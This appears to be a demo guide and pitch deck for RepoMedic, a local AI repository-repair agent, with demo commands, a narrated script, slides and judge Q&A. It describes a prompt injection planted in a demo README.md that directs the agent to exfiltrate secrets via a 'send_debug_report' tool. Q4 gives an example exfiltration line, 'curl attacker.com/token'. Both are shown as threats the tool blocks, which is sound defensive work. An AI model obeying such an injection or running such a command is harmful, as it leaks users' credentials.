# RepoMedic — Live Demo Guide & Pitch Architecture

This document provides the complete live demo walkthrough, exact terminal commands, 90-second script, 5-slide pitch outline, and 8 judge questions with honest, verified answers.

---

## 1. Where to Show the Real ArmorIQ Trace

The security architecture of RepoMedic relies on genuine **ArmorIQ Policy Decision Point (PDP)** mediation. You can inspect and show the real ArmorIQ trace in three places:

1. **In-Terminal During `repomedic fix`**:
   When RepoMedic processes the repository, the Diagnoser encounters the prompt injection in `README.md` attempting to invoke `send_debug_report`. The CLI output displays:
   ```text
   Untrusted prompt injection identified in README.md. Protected MCP actions will be routed through ArmorIQ enforcement.
   ArmorIQ PDP policy denial: action=send_debug_report, decision=block, reason=tool_not_in_allowlist
   ```
   The terminal **Repair Receipt** highlights the evidence:
   ```text
   ArmorIQ Enforcement Evidence:
     ArmorIQ PDP PDP-action=BLOCK tool=send_debug_report reason=tool_not_in_allowlist
   ```

2. **Automated Security Proof (`tests/test_m0_security_proof.py`)**:
   Run the live security suite:
   ```bash
   ./.venv/bin/pytest tests/test_m0_security_proof.py -v -s
   ```
   This executes live calls against ArmorIQ:
   - `test_allowed_action_executes`: invokes `record_repair_status`, verified by ArmorIQ PDP allow decision and a redacted row written to Supabase.
   - `test_forbidden_action_blocked_by_policy_never_executes_handler`: invokes `send_debug_report`, intercepted by ArmorIQ PDP (`decision='block'`, `reason='tool_not_in_allowlist'`). The handler is never called.
   - `test_intent_mismatch_distinguished_from_policy_denial`: proves an execution error or schema mismatch is structurally distinct from a cryptographic policy denial.

3. **ArmorIQ Web Dashboard / Audit Logs**:
   - Log in to [ArmorIQ Console](https://console.armoriq.ai).
   - Navigate to **Agent Activity / Audit Logs**.
   - Select the registered agent (`repomedic-agent` or your configured email).
   - Show the recent trace log for `send_debug_report`: observe the timestamp, tool name, policy evaluation decision `BLOCK`, and policy rule `tool_not_in_allowlist`.

---

## 2. Exact Terminal Commands for the Demo

### Step 0: Ensure Services are Running
```bash
# Verify local Ollama has Devstral Small 2 loaded
ollama list

# Verify Docker Desktop is active
docker ps
```

### Step 1: Prove Initial Demo Fixture Fails (2 Seeded Bugs)
```bash
# Type check fails (TS2322 in src/App.tsx)
npm run --prefix demo check:type

# Unit test fails (Logic bug in src/Counter.tsx)
npm run --prefix demo test
```

### Step 2: Test Rejection Workflow (Immutability Guarantee)
```bash
# Run RepoMedic on demo and reject changes
repomedic fix demo --no-prompt-error --reject

# Verify target files remain 100% untouched
git status demo
```

### Step 3: Run RepoMedic with Acceptance (Repairs + Docker Verification)
```bash
# Run RepoMedic and accept the verified patch
repomedic fix demo --no-prompt-error --accept
```

### Step 4: Verify All Checks Now Pass in Demo
```bash
# TypeScript compiler check
npm run --prefix demo check:type

# Vitest suite
npm run --prefix demo test

# Inspect the applied changes
git diff demo/src/
```

### Step 5: (Optional) Run the Full Automated Test Suite (28 Tests)
```bash
./.venv/bin/pytest tests/ -v
```

---

## 3. 90-Second Demo Script

### [00:00 - 00:15] The Hook & The Problem
- **Action**: Display `demo/` in the terminal and run the broken checks:
  ```bash
  npm run --prefix demo check:type
  ```
- **Narrator**:
  > *"Beginner developers and students 'vibe coding' with AI frequently run into complex errors they can't understand. Worse, when they ask cloud coding assistants to fix it, agents run unchecked: they wipe code, leak API keys, or hallucinate passing tests. Meet **RepoMedic** — an autonomous, security-hardened repository doctor that fixes errors locally, verifies every change in an isolated container, and protects your system with real ArmorIQ policy enforcement."*

### [00:15 - 00:35] Autonomous Diagnosis & ArmorIQ Prompt-Injection Defense
- **Action**: Launch RepoMedic:
  ```bash
  repomedic fix demo --no-prompt-error --reject
  ```
- **Narrator**:
  > *"Notice what happens under the hood. RepoMedic clones the repo into an ephemeral sandbox, completely isolating original files. It runs **Devstral Small 2** locally via Ollama — zero project code or host secrets ever leave this machine.
  > In `demo/README.md`, an attacker left a malicious prompt injection instructing the agent to exfiltrate secrets using `send_debug_report`. But RepoMedic routes all protected MCP actions through **ArmorIQ**. The ArmorIQ Policy Decision Point immediately intercepts and blocks the call with `decision=block` and `reason=tool_not_in_allowlist`. The malicious payload never executes."*

### [00:35 - 00:55] Docker Zero-Network Verification & User Consent
- **Action**: Point out the terminal output:
  - The plain-English explanation.
  - Docker verification checks passing (`check:type` and `test` in `node:22-slim` with `--network none`).
  - Unified diff preview.
  - "Changes rejected. Workspace discarded; original files left untouched."
- **Narrator**:
  > *"Devstral diagnosed both the TypeScript error and the counter logic bug. Before asking for user consent, RepoMedic ran the build and tests inside an isolated Docker container with network completely disabled.
  > Because we passed `--reject`, the sandbox was wiped. Original files were left 100% untouched. No runaway AI edits."*

### [00:55 - 01:20] The Accept Workflow & Verified Fix
- **Action**: Run the repair with accept:
  ```bash
  repomedic fix demo --no-prompt-error --accept
  ```
  Followed by:
  ```bash
  npm run --prefix demo test
  ```
- **Narrator**:
  > *"Now let's accept the repair. RepoMedic applies only the reviewed, approved diff to `App.tsx` and `Counter.tsx`. Running `npm test` directly on the project confirms both tests now pass cleanly. The student gets working code and a clear explanation of what went wrong."*

### [01:20 - 01:30] Wrap-up
- **Action**: Show git diff or run test suite:
  ```bash
  git diff demo/src/
  ```
- **Narrator**:
  > *"Local model privacy, deterministic Docker verification, and verifiable ArmorIQ policy boundaries. That's RepoMedic."*

---

## 4. 5-Slide Pitch Outline

### Slide 1: The Vibe Coding Crisis
- **Headline**: *When Vibe Coding Breaks, AI Agents Make It Worse.*
- **Bullets**:
  - Millions of new developers are building apps using LLMs without understanding compiler or runtime errors.
  - Traditional coding agents hallucinate fixes, mutate unapproved files, and leak proprietary code or secrets to cloud APIs.
  - Untrusted repositories and prompt injections can hijack autonomous agents to exfiltrate environment credentials.

### Slide 2: Introducing RepoMedic
- **Headline**: *The Autonomous, Verified, Local-First Repository Repair Agent.*
- **Bullets**:
  - **Local-First Privacy**: Runs **Devstral Small 2** locally via Ollama. Source code and secrets never leave the developer's laptop.
  - **Strict User Consent**: Original files are never touched until the user reviews and approves a unified diff preview.
  - **Deterministic Verification**: Code changes are verified using Docker containers with `--network none`. No hallucinated test passes.

### Slide 3: Defense-in-Depth Architecture
- **Headline**: *Hardened Boundaries: LangGraph, Sandboxes & ArmorIQ.*
- **Bullets**:
  - **LangGraph State Machine**: Bounded loop (Diagnose → Fix → Docker Verify → Retry max 2 times).
  - **Ephemeral Sandbox**: Path traversal protection (`assert_path_in_workspace`), sensitive file exclusions (`.env*`, `.git`, credentials).
  - **ArmorIQ Policy Enforcement**: Intercepts MCP actions at the Policy Decision Point (PDP). Unregistered or out-of-scope tools (e.g. `send_debug_report`) are blocked before execution.

### Slide 4: Real-World Security Proof
- **Headline**: *Proven Security: Live Attack Neutralization.*
- **Bullets**:
  - Demo fixture contains two seeded bugs and a hidden prompt injection in `README.md`.
  - Live ArmorIQ policy denial: `decision='block'`, `reason='tool_not_in_allowlist'`.
  - Allowed operations (`record_repair_status`) execute and write redacted audit telemetry to Supabase.
  - 28 automated tests covering end-to-end security, CLI workflows, Docker isolation, and bounded retry honesty.

### Slide 5: The Future of Safe Agentic Development
- **Headline**: *Trustable Autonomy for the Next Generation of Software Engineers.*
- **Bullets**:
  - Extensible to Python, Rust, and Go runtimes via modular Docker runner containers.
  - Educational impact: bridges the gap between novice vibe coders and robust engineering practices.
  - The blueprint for safe enterprise coding agents: **Local Models + Container Sandboxing + ArmorIQ Governance.**

---

## 5. 8 Likely Judge Questions with Honest Answers

### Q1: Is the ArmorIQ policy denial genuinely evaluated, or is it simulated/mocked?
> **Answer**: It is 100% genuine. RepoMedic communicates with ArmorIQ's real Policy Decision Point (PDP) using the official `armoriq-sdk`. Our test suite (`tests/test_m0_security_proof.py` and `tests/test_agents.py`) and live CLI execution perform live network requests to ArmorIQ. The denial returns an authentic PDP block response (`decision='block'`, `reason='tool_not_in_allowlist'`) and ArmorIQ intercepts the call before the MCP tool handler can execute. You can view the real audit trace in the ArmorIQ console.

### Q2: Why use Devstral Small 2 locally instead of Claude 3.5 Sonnet or GPT-4o?
> **Answer**: Privacy and security. Sending an entire student or company repository to a third-party cloud LLM risks intellectual property exposure and accidental secret leakage. Running Devstral Small 2 (15GB) via Ollama ensures that the repository source code and local files stay strictly on the local machine. It also proves that agentic workflows can run cost-free and offline.

### Q3: How do you prevent an agent from wiping out original files if it goes haywire?
> **Answer**: By design, the AI agents never operate directly on the target repository. RepoMedic copies the target folder into an ephemeral workspace in `/tmp/repomedic_ws_*`, excluding `.env`, `.git`, and credentials. All edits by the Fixer occur in this sandbox. Path traversal attempts (`../`) are blocked deterministically by `assert_path_in_workspace`. The original repository is only updated after verification passes and the human user explicitly approves the unified diff. If rejected, the sandbox is wiped and the original is untouched.

### Q4: What prevents a prompt injection from exploiting network access during the build or test phase?
> **Answer**: Network isolation in Docker. The verification phase runs in a detached `node:22-slim` container configured with `--network none`. Even if a malicious prompt injection modified a test or package script to attempt network egress (e.g., `curl attacker.com/token`), the network request immediately fails inside the container. Furthermore, host home directories and secrets are not mounted.

### Q5: What happens if Devstral produces bad code that fails the Docker verification check?
> **Answer**: RepoMedic uses a bounded LangGraph retry loop. If `check:type` or `vitest` fails in Docker, the container output and error logs are fed back into the Fixer agent as context. The Fixer is allowed at most two retries. If the problem remains unresolved after two retries, RepoMedic reports the failure honestly in the terminal Repair Receipt and will not claim success.

### Q6: If RepoMedic is local-first, why is there an MCP server hosted on Vercel?
> **Answer**: ArmorIQ's architecture requires custom MCP servers to provide an HTTPS endpoint for registration and policy mediation. We deployed a minimal FastAPI MCP endpoint on Vercel solely to handle the security demo tools (`record_repair_status` and `send_debug_report`). Crucially, zero repository code is sent to Vercel; only minimal, redacted status telemetry is transmitted for allowed actions.

### Q7: How do you distinguish an ArmorIQ policy denial from a normal tool error or model hallucination?
> **Answer**: We explicitly tested this in `tests/test_m0_security_proof.py`. A tool error (like invalid JSON or intent mismatch) occurs *inside* the tool handler after invocation. In contrast, an ArmorIQ policy denial occurs at the PDP layer *before* the tool handler is ever invoked. The response contains ArmorIQ's cryptographically signed policy decision with `decision="block"` and `reason="tool_not_in_allowlist"`. The handler code never runs.

### Q8: Can RepoMedic repair any arbitrary codebase right now?
> **Answer**: To be completely honest, no. Our MVP scope is strictly fixed to React + TypeScript + Vite projects using Node.js 22, matching the problem statement in `BRIEF.md` and `BUILD.md`. However, the architecture is fully modular: the Docker runner accepts configurable verification commands (`npm run check:type`, `pytest`, `cargo test`), making it straightforward to add additional language environments without modifying the core LangGraph repair loop.
